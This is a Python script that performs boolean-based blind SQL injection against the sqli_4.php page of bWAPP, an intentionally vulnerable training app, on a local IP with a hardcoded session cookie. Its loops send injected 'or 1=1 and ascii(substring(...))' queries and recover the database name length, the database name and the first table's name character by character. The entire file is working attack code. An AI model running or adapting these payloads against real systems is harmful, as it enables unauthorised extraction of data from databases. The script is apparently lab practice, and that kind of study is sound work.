import requests

ROOT = "http://192.168.0.71"
PHPSESSID = "b583ab9534b8415b703e439b2a699e8b"
COOKIES = {
    'PHPSESSID':PHPSESSID,
    'security_level':'0',
}

def find_database_length():
    n=1
    while True:
        sql="?title=%27+or+1%3D1+and+length%28database%28%29%29%3D+{}+%23&action=search".format(n)
        url = ROOT + '/bWAPP/sqli_4.php'+sql
        response=requests.get(url,cookies=COOKIES)
        
        if "exists" in response.text:
            print("DB legnth : {}".format(n))
            break
        else:
            n+=1

    return n    

def find_database_name():
    database=""
    for j in range(1,6):
        for i in range(65, 123):
            sql = "?title='+or+1%3D1+and+ascii(substring(database()%2C+{}+%2C1))+%3D+{}+%23&action=search".format(j,i)
            url = ROOT + '/bWAPP/sqli_4.php'+sql
            response=requests.get(url,cookies=COOKIES)
        
            if "exists" in response.text:
                database+=chr(i)
                print("DB name : ", database)
                break
            else:
                i+=1
    
    return database

def find_table_length():
    for i in range(1, 20):
        sql="?title='+or+1%3D1+and+length((SELECT+table_name+from+information_schema.tables+where+table_schema%3D'bWAPP'+limit+0%2C1))%3D+{}+%23&action=search".format(i)
        url=ROOT+'/bWAPP/sqli_4.php'+sql
        response = requests.get(url,cookies=COOKIES)

        if "exists" in response.text:
            print("Table length : {}".format(i))
            break
        else:
            i+=1
    return i

def find_table_name():
    table=""
    for j in range(1,6):
        for i in range(65, 123):
            sql = "?title='+or+1%3D1+and+ascii((substring((select+table_name+from+information_schema.tables+where+table_schema%3D'bWAPP'+limit+0%2C1)%2C+{}+%2C+1)))%3D'+{}+'+%23&action=search".format(j,i)
            url = ROOT + '/bWAPP/sqli_4.php'+sql
            response=requests.get(url,cookies=COOKIES)
        
            if "exists" in response.text:
                table+=chr(i)
                print("Table name : ", table)
                break
            else:
                i+=1
    return table


find_database_length()
find_database_name()
find_table_length()
find_table_name()